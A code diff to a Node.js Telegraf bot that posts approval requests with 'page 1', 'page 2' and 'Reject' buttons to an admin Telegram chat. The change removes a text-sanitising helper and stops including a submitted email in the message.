@@ -1,13 +1,6 @@
 // bot.js
 const { Telegraf, Markup } = require("telegraf");
 
-function safeText(s, maxLen = 140) {
-  if (typeof s !== "string") return "";
-  // Avoid huge spam + keep message tidy
-  const trimmed = s.trim().replace(/\s+/g, " ");
-  return trimmed.length > maxLen ? trimmed.slice(0, maxLen) + "…" : trimmed;
-}
-
 function createBot({ botToken, adminChatId, store }) {
   if (!botToken) throw new Error("BOT_TOKEN missing");
   if (!adminChatId) throw new Error("ADMIN_CHAT_ID missing");
@@ -58,39 +51,32 @@ function createBot({ botToken, adminChatId, store }) {
           ? "✅ Approved: Page 2"
           : "❌ Rejected";
 
-      // Update the message so you can see what you chose
+      // Update the same Telegram message
       const originalText = ctx.callbackQuery.message?.text || "Approval request";
       await ctx.editMessageText(`${originalText}\n\n${decisionText}`);
 
       await ctx.answerCbQuery("Saved.");
     } catch (err) {
       console.error("callback_query error:", err);
-      try {
-        await ctx.answerCbQuery("Error.");
-      } catch {}
+      try { await ctx.answerCbQuery("Error."); } catch {}
     }
   });
 
   /**
-   * Sends 3 buttons to admin chat + requestId + submitted info (email).
-   * @param {string} requestId
-   * @param {{email?: string}} details
+   * Sends ONLY the 3 buttons (and the requestId text).
    */
-  async function sendApprovalButtons(requestId, details = {}) {
-    const email = safeText(details.email || "");
-
+  async function sendApprovalButtons(requestId) {
     const keyboard = Markup.inlineKeyboard([
       [Markup.button.callback("Go to page 1", `p1:${requestId}`)],
       [Markup.button.callback("Go to page 2", `p2:${requestId}`)],
       [Markup.button.callback("Reject", `rej:${requestId}`)]
     ]);
 
-    const msg =
-      `Approval needed\n` +
-      `ID: ${requestId}\n` +
-      (email ? `Input: ${email}` : "");
-
-    return bot.telegram.sendMessage(adminChatId, msg, keyboard);
+    return bot.telegram.sendMessage(
+      adminChatId,
+      `Approval needed\nID: ${requestId}`,
+      keyboard
+    );
   }
 
   return { bot, sendApprovalButtons };
